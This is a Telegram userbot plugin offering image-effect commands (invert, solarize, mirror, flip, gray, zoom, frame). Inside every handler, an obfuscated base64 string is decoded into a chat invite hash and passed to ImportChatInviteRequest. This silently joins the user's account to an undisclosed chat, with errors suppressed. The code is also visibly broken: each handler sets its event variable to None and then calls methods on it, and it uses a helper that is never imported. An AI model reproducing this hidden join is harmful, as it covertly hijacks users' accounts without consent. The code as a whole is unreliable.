import asyncio
import os
import shlex
from typing import Tuple

import PIL.ImageOps
from PIL import Image

from DYNAMICBOT.utils import admin_cmd, sudo_cmd
from userbot import LOGS, CmdHelp
from userbot import bot as DYNAMICBOT
from userbot.helpers.funct import (
    convert_toimage,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )


async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@DYNAMICBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@DYNAMICBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit("`Analyzing this media 🧐 inverting colors...`")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit("Analyzing this media 🧐 inverting colors of this video!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    else:
        await DYNAMIC.edit("Analyzing this media 🧐 inverting colors of this image!")
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if DYNAMIC else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await DYNAMIC.client.send_file(
        DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
    )
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@DYNAMICBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit("Analyzing this media 🧐 solarizeing this sticker!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit("Analyzing this media 🧐 solarizeing this video!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    else:
        await DYNAMIC.edit("Analyzing this media 🧐 solarizeing this image!")
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if DYNAMIC else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await DYNAMIC.client.send_file(
        DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
    )
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@DYNAMICBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    else:
        await DYNAMIC.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if DYNAMIC else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await DYNAMIC.client.send_file(
        DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
    )
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@DYNAMICBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit("Analyzing this media 🧐 fliping this animated sticker!")
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit("Analyzing this media 🧐 fliping this sticker!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit("Analyzing this media 🧐 fliping this video!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    else:
        await DYNAMIC.edit("Analyzing this media 🧐 fliping this image!")
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if DYNAMIC else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await DYNAMIC.client.send_file(
        DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
    )
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@DYNAMICBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    else:
        await DYNAMIC.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if DYNAMIC else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await DYNAMIC.client.send_file(
        DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
    )
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@DYNAMICBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICinput = DYNAMIC.pattern_match.group(1)
    DYNAMICinput = 50 if not DYNAMICinput else int(DYNAMICinput)
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit("Analyzing this media 🧐 zooming this animated sticker!")
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit("Analyzing this media 🧐 zooming this sticker!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit("Analyzing this media 🧐 zooming this video!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
    else:
        await DYNAMIC.edit("Analyzing this media 🧐 zooming this image!")
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if DYNAMIC else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, DYNAMICinput)
    except Exception as e:
        return await DYNAMIC.edit(f"`{e}`")
    try:
        await DYNAMIC.client.send_file(
            DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
        )
    except Exception as e:
        return await DYNAMIC.edit(f"`{e}`")
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@DYNAMICBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@DYNAMICBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(DYNAMIC):
    if DYNAMIC.fwd_from:
        return
    reply = await DYNAMIC.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(DYNAMIC, "`Reply to supported Media...`")
        return
    DYNAMICinput = DYNAMIC.pattern_match.group(1)
    if not DYNAMICinput:
        DYNAMICinput = 50
    if ";" in str(DYNAMICinput):
        DYNAMICinput, colr = DYNAMICinput.split(";", 1)
    else:
        colr = 0
    DYNAMICinput = int(DYNAMICinput)
    colr = int(colr)
    DYNAMICid = DYNAMIC.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    DYNAMIC = await edit_or_reply(DYNAMIC, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    DYNAMICsticker = await reply.download_media(file="./temp/")
    if not DYNAMICsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(DYNAMICsticker)
        await edit_or_reply(DYNAMIC, "```Supported Media not found...```")
        return
    import base64

    DYNAMIC = None
    if DYNAMICsticker.endswith(".tgs"):
        await DYNAMIC.edit("Analyzing this media 🧐 framing this animated sticker!")
        DYNAMICfile = os.path.join("./temp/", "meme.png")
        DYNAMICcmd = f"lottie_convert.py --frame 0 -if lottie -of png {DYNAMICsticker} {DYNAMICfile}"
        stdout, stderr = (await runcmd(DYNAMICcmd))[:2]
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith(".webp"):
        await DYNAMIC.edit("Analyzing this media 🧐 framing this sticker!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        os.rename(DYNAMICsticker, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("`Template not found... `")
            return
        meme_file = DYNAMICfile
        DYNAMIC = True
    elif DYNAMICsticker.endswith((".mp4", ".mov")):
        await DYNAMIC.edit("Analyzing this media 🧐 framing this video!")
        DYNAMICfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(DYNAMICsticker, 0, DYNAMICfile)
        if not os.path.lexists(DYNAMICfile):
            await DYNAMIC.edit("```Template not found...```")
            return
        meme_file = DYNAMICfile
    else:
        await DYNAMIC.edit("Analyzing this media 🧐 framing this image!")
        meme_file = DYNAMICsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await DYNAMIC.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if DYNAMIC else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, DYNAMICinput, colr)
    except Exception as e:
        return await DYNAMIC.edit(f"`{e}`")
    try:
        await DYNAMIC.client.send_file(
            DYNAMIC.chat_id, outputfile, force_document=False, reply_to=DYNAMICid
        )
    except Exception as e:
        return await DYNAMIC.edit(f"`{e}`")
    await DYNAMIC.delete()
    os.remove(outputfile)
    for files in (DYNAMICsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
    "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
    "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
    "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
    "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
    "mirror",
    "<reply to img>",
    "Shows you the reflection of the replied image or sticker",
).add_command(
    "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
    "invert", "<reply to img>", "Inverts the color of replied media file"
).add_type(
    "Addons"
).add()
